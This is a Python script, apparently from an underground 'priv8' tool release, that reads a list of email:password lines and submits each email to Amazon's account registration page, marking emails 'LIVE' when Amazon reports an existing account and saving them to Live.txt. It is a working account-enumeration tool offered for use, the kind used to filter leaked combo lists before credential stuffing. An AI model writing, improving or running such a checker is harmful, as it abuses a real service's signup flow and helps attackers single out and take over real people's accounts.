import requests

# Tools Priv8 Valid Email Python (MODIF)
# Output Live & Die - Users & Password Target
# Tested : Windows & Termux Working
# Regard Boychongzen aka Xroot


print ('''\033[1m\033[93m[\033[91m!\033[93m] Priv8 Valid Email Python (MODIF) 
\033[1;34mAuthor \033[91m:\033[37m Boychongzen aka Xroot \n \033[1;34m          
_______    ______    _____       _____              ____________  ____________                                                
\      |  |      | /      |_    |\    \            /            \ \           \                                               
 |     /  /     /|/         \    \\    \          |\___/\  \\___/| \           \                                              
 |\    \  \    |/|     /\    \    \\    \          \|____\  \___|/  |    /\     |                                             
 \ \    \ |    | |    |  |    \    \|    | ______        |  |       |   |  |    |                                             
  \|     \|    | |     \/      \    |    |/      \  __  /   / __    |    \/     |                                             
   |\         /| |\      /\     \   /            | /  \/   /_/  |  /           /|                                             
   | \_______/ | | \_____\ \_____\ /_____/\_____/||____________/| /___________/ |                                             
    \ |     | /  | |     | |     ||      | |    |||           | /|           | /                                              
     \|_____|/    \|_____|\|_____||______|/|____|/|___________|/ |___________|/                                               
                                  _____                                                                                     
                               _____\    \        ___________            _____          ____________  _____                   
                              /    / |    |      /           \         /      |_       /            \|\    \                  
                             /    /  /___/|     /    _   _    \       /         \     |\___/\  \\___/|\\    \                 
                            |    |__ |___|/    /    //   \\    \     |     /\    \     \|____\  \___|/ \\    \                
                            |       \         /    //     \\    \    |    |  |    \          |  |       \|    | ______        
                            |     __/ __     /     \\_____//     \   |     \/      \    __  /   / __     |    |/      \       
                            |\    \  /  \   /       \ ___ /       \  |\      /\     \  /  \/   /_/  |    /            |       
                            | \____\/    | /________/|   |\________\ | \_____\ \_____\|____________/|   /_____/\_____/|       
                            | |    |____/||        | |   | |        || |     | |     ||           | /  |      | |    ||       
                             \|____|   | ||________|/     \|________| \|_____|\|_____||___________|/   |______|/|____|/       
                                   |___|/                                                                                 
 ''')
print"\033[1;31mEksekusi \033[1;34m: \033[1;37m[Windows]python \033[1;31m& \033[1;37m[Termux]python2 \033[1;31mValidEmail.py list.txt"

print ('\033[1;31m--------------------------------------------\033[1;34m( \033[1;33mWELCOME My Tools ValidEmail \033[1;34m)\033[1;31m-----------------------------------------------\033[1;m\n')

live = open('Live.txt','w')
die = open('Die.txt','w')

list = raw_input("\033[33;1mList eMail Cuks : \033[0m")
link = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
s = requests.session()
g = s.get(link, headers=head)
list = open(list, 'r')
print("-"*50)
while True:
	email = list.readline().replace('\n','')
	if not email:
		break
	xcroot = email.strip().split(':')
	xxx = {'customerName':'xcroot','email': xcroot[0],'emailCheck': xcroot[0],'password':'xcroot123','passwordCheck':'xcroot123'}
	cek = s.post(link, headers=head, data=xxx).text
	if "You indicated you are a new customer, but an account already exists with the e-mail" in cek:
		print("\033[32;1mLIVE\033[0m | "+email+" | [Email ]")
		live.write(email)
	else:
		print("\033[31;1mDIE\033[0m | "+email+" | [ Email ]")
		die.write(email)
print("-"*50)
print("\033[35;1mProccess Checking Done Email")
print("Valid Email Saved In : Live.txt\nDie Email Saved In : Die.txt")
